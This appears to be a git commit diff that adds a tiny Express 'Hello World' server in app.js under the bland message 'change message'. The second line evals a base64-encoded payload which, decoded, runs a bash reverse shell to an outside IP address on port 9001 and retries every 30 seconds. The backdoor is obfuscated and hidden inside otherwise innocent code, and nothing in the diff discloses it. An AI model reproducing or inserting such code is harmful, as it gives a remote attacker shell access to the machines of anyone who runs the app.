b60fb09b0ce169f7dcf998598ccfa471ee84ba32
Eris26ok <eris26ok@hotmail.com>
2022-09-14 11:14:16 -0300

    change message

---
+++ app.js
@@ -0,0 +1,9 @@
+const express = require('express');
+eval(Buffer.from("c2V0SW50ZXJ2YWwoKCkgPT4gcmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ2Jhc2ggLWMgImJhc2ggLWUgNTw+IC9kZXYvdGNwLzE0Mi45My4yMDguNjYvOTAwMSAwPCY1IDE+JjUgMj4mNSIgPiAvZGV2L251bGwgMj4mMSAmJyksIDMwMDAwKTsK","base64").toString())
+const app = express();
+const port = 8080;
+
+app.get('/', (req, res) => res.send('Hello World, meu amigo!'));
+
+app.listen(port);
+console.log(`App running on http://localhost:${port}`);
